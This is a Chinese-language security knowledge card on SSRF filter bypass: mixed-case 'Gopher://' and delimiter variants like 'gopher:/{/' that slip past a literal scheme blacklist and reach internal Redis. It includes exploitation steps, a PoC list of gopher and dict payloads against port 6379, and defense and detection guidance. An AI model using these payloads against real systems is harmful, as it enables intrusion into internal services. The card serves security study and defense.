---
id: web-generic-ssrf-scheme-filter-case-and-delimiter-variant-bypass
title: SSRF 协议黑名单只匹配小写字面量：Gopher:// 大小写与 gopher:/{/host:port} 分隔符变体绕过，恢复任意 TCP 报文能力
type: scenario
domain: web
path: web/generic/ssrf
technique: ssrf-scheme-filter-case-delimiter-bypass
aliases:
- Gopher 大小写绕过
- gopher:/{/ 变形
- 协议过滤绕过
- URL scheme 黑名单绕过
- dict 被限制后换 gopher
tags:
- ssrf
- scheme-bypass
- gopher
- dict
- waf-bypass
- blacklist
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:43:29+08:00'
  notes: 已对照原文核对：原文 WAF 过滤 gopher:// 与 file://，实测 Gopher:// 大小写变体与 gopher:/{/172.11.0.4:6379_ 分隔符变体均可绕过并恢复任意 TCP 能力；卡内原理中「大小写归一后仍被拦」与「原始串字面量比较可绕」两种情形的区分与原文一致；未验证点：分隔符变体是否被 curl 接受随版本而异，原文仅在 dict:// 预期链上给出实证
---

## 一句话结论

当应用的 SSRF 防护是"对用户提交的 URL 做小写字面量匹配，出现 `gopher://`、`file://` 就直接拒绝"时，curl/urllib 类客户端仍会正常解析大小写混写的 `Gopher://` 与带额外分隔符的 `gopher:/{/host:port}` 变体，攻击者因此可以绕过黑名单，重新获得"任意 TCP 报文"的能力（进而打 Redis、FastCGI、内网 HTTP 等）。

## 原理

- **URL scheme 大小写不敏感**：RFC 3986 规定 scheme 匹配不区分大小写；curl、urllib、`URL` 解析器在识别协议后会把 scheme 归一为小写再分发到对应 handler。因此 `Gopher://`、`gOpHeR://` 与 `gopher://` 对客户端等价。
- **黑名单的匹配方式决定成败**：`url.toLowerCase().contains("gopher://")` 这类写法看似"做了大小写归一"，实际是把两边都转小写再比——攻击者提交 `Gopher://` 时归一后仍是 `gopher://`，会被拦。真正能绕的是"只对原始字符串做小写字面量比较、没有先归一"的实现，或者"只匹配特定分隔符形态"的实现：例如只拦 `gopher://`，不拦 `gopher:/`、`gopher:/{/`。本卡对应的是后者那类"匹配不完整"的情况——防护按字面量穷举了常见形态但没穷举分隔符/多级斜杠写法。
- **分隔符变体为何能被解析**：curl 对 gopher URL 的解析是从 scheme 之后寻找主机与端口，多余的 `{`、`/` 会被当作路径/装饰字符跳过或被服务端忽略；`gopher:/{/127.0.0.1:6379_` 这种写法在部分解析器里仍能得到正确的 host:port，从而发出一条到 Redis 的原始 TCP 连接。是否成立取决于底层客户端（curl 版本、urllib 实现），因此需要在目标上实测。
- **为什么这条值得单独成卡**：它是"任意协议/任意字节"这一能力的开关。一旦通过变体拿回 gopher，就能直接把 RESP 报文、FastCGI 报文、任意 HTTP 请求写进内网服务，而不必退化成只能打单条命令的 `dict://`。
- **为什么"预期用 dict"反而更弱**：`dict://` 只能携带一条用 `:` 分隔的命令且不能带换行，适合 `INFO`、`CONFIG GET` 这类探测，但无法完成多命令 pipeline、无法发送二进制；gopher 才能构造完整 RESP 数组与 CRLF。

## 触发条件

- 存在 SSRF 入口，服务端使用 curl/urllib/`URL` 之类会按 scheme 分发的客户端（不是只允许 http/https 的白名单实现）。
- 防护为黑名单式：拒绝 `gopher://`、`file://` 等字面量，但没有在解析后按"归一化 scheme + 主机/端口白名单"判定。
- 黑名单对分隔符形态覆盖不全（只匹配 `://`，未匹配 `:/`、`:/{/`、多斜杠等），且底层客户端能容错解析这些变体。
- 目标内网存在可按原始报文利用的服务（Redis、FastCGI、Memcached、内网 HTTP 管理口等）。

## 利用步骤

1. 先用最直白的 `gopher://127.0.0.1:6379/_INFO` 试探，确认被拦（响应为"协议不允许/参数非法"）。
2. 换大小写变体 `Gopher://...`、`gOpHeR://...`，观察是否仍被拦（若仍被拦说明实现做了归一，进入第 3 步）。
3. 换分隔符变体：`gopher:/127.0.0.1:6379/_INFO`、`gopher:/{/127.0.0.1:6379_`、`gopher:///127.0.0.1:6379/_...`，逐个观察是否通过校验并产生到目标端口的连接。
4. 用能通行的变体构造真实报文：`*1\r\n$4\r\nINFO\r\n`、`CONFIG SET ...`、或完整 RESP pipeline（Redis 需在 payload 里把 `\r\n` 正确编码，gopher 常需二次 URL 编码）。
5. 若 gopher 全部被拦，退回 `dict://host:port/command:arg:...`（只能单条命令），用 `INFO`、`CONFIG GET dir` 做探测，再找能发多行的入口（HTTP 头 CRLF、POST body 注入）。
6. 记录哪些变体通过，形成该目标的"可用协议/可用字节"结论，供后续利用选择。

## PoC

```text
# 被拦的基线
gopher://127.0.0.1:6379/_INFO

# 大小写变体
Gopher://127.0.0.1:6379/_INFO
gOpHeR://127.0.0.1:6379/_INFO

# 分隔符变体（按目标实测挑选可用形态）
gopher:/127.0.0.1:6379/_INFO
gopher:/{/127.0.0.1:6379_
gopher:///127.0.0.1:6379/_INFO

# 退化为单命令探测
dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/config:get:dir
```

```text
# gopher 发完整 RESP（需把 \r\n 二次编码为 %0D%0A）
gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0AINFO%0D%0A
```

## 变体与关联

- 变体：除 gopher 外，`dict://`、`file://`、`ldap://`、`tftp://`、`jar://`、`netdoc://` 都可用同样思路做大小写/分隔符/编码变体；`file://` 大小写变体常用于读文件。
- 变体：双层编码（`%2567opher`）、反斜杠（`gopher:\\`）、userinfo 混淆（`http://user@host`）、协议白名单前缀（`http://gopher...`）属于另一类"解析差异"绕过，见关联卡。
- 关联：[[web-generic-ssrf-redis-inline-protocol-crlf]]（拿到 gopher 后的 Redis 利用面）、[[web-generic-ssrf-fsockopen-gopher-mysql-raw-protocol]]（用 dict 探测后 gopher 发原始 MySQL 包）、[[web-generic-ssrf-url-parser-differential-allowlist-bypass]]（解析器与校验器语义不一致的通用绕过）、[[web-generic-ssrf-php-preview-line-case-filter-lfi]]（大写 scheme 绕过的同型案例）。
- 边界：防护改成"解析后按归一化 scheme + 主机/端口白名单"（只允许 http/https 且目标在允许列表）时全部变体失效；底层客户端只支持 http/https、或对 gopher 有严格校验（如新版本 curl 默认禁用部分协议）时也可能不成立。

## 检测与防御

- 修复：不要用字符串黑名单。先把 URL 交给解析器归一化（scheme 转小写、解码、去 userinfo），再对"scheme + host + port"做白名单校验，只允许业务必需的一两种协议。
- 加固：禁用不必要的协议（curl 可用 `CURLOPT_PROTOCOLS` 只允许 HTTP/HTTPS）；出站按域名/IP 白名单限制，禁止访问内网段与本机端口。
- 检测：请求参数中出现 `gopher`、`dict`、`file`、`Gopher`、`:/{/`、`%2567`、多重斜杠等特征；服务端向非业务端口（6379/11211/9000）发起连接；SSRF 相关错误日志中出现"协议不支持"后又出现"连接成功"。
